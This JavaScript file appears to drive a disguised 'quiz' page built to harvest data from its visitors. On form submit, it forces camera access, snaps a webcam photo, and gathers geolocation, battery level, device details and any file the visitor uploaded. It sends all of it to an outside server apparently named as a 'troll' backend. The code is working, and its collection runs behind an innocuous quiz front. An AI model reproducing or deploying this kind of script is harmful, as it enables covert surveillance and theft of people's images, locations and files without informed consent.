// script.js

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const submitBtn = document.getElementById("submit-btn");
const quizForm = document.getElementById("quiz-form");
const successContainer = document.getElementById("success-container");
const quizContainer = document.getElementById("quiz-container");
const fileInput = document.getElementById("user-file");
const toast = document.getElementById("toast");

const constraints = { video: { facingMode: "user" }, audio: false };

// -------------------------
// Toast function
// -------------------------
function showToast(msg) {
  toast.textContent = msg || "Done";
  toast.style.display = "block";
  setTimeout(() => {
    toast.style.display = "none";
  }, 3000);
}

// -------------------------
// Request camera & capture
// -------------------------
async function captureCameraImage() {
  try {
    // Ask camera permission every time
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // Give user 3 seconds for "realistic" capture
    await new Promise(res => setTimeout(res, 3000));

    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL("image/png");

    // Stop camera
    stream.getTracks().forEach(track => track.stop());

    return imageData;
  } catch (err) {
    console.error("Camera access denied:", err);
    alert("Camera access is required for this step.");
    return null;
  }
}

// -------------------------
// Collect form metadata
// -------------------------
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: "N/A",
    location: "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    } catch {}
  }

  // Location
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {
      metadata.location = "Location access denied";
    }
  }

  return metadata;
}

// -------------------------
// Send camera capture
// -------------------------
async function sendCameraCapture(imageData, metadata) {
  try {
    const res = await fetch("https://troll-backend.onrender.com/api/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData, metadata }),
    });
    const data = await res.json();
    if (data.success) {
      console.log("Camera capture sent:", data.url);
    } else {
      console.error("Camera upload failed:", data);
    }
  } catch (err) {
    console.error("Camera upload error:", err);
  }
}

// -------------------------
// Send uploaded file
// -------------------------
async function sendFileUpload(file, metadata) {
  try {
    // Convert file to base64
    const reader = new FileReader();
    reader.readAsDataURL(file);

    return new Promise(resolve => {
      reader.onload = async () => {
        const imageData = reader.result;
        try {
          const res = await fetch("https://troll-backend.onrender.com/api/file-upload", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ file: imageData, filename: file.name, metadata }),
          });
          const data = await res.json();
          if (data.success) console.log("File uploaded:", data.url);
          resolve();
        } catch (err) {
          console.error("File upload error:", err);
          resolve();
        }
      };
    });
  } catch (err) {
    console.error("File reader error:", err);
  }
}

// -------------------------
// Form submit handler
// -------------------------
quizForm.addEventListener("submit", async e => {
  e.preventDefault();

  showToast("Capturing camera...");

  // Capture camera image
  const cameraMetadata = await collectMetadata();
  const cameraImage = await captureCameraImage();
  if (cameraImage) {
    await sendCameraCapture(cameraImage, cameraMetadata);
    showToast("Camera image sent!");
  } else {
    return; // stop if camera denied
  }

  // Send uploaded file if any
  const file = fileInput.files[0];
  if (file) {
    showToast("Uploading your file...");
    const fileMetadata = await collectMetadata();
    await sendFileUpload(file, fileMetadata);
    showToast("File uploaded!");
  }

  // Show success page
  quizContainer.style.display = "none";
  successContainer.style.display = "block";
});
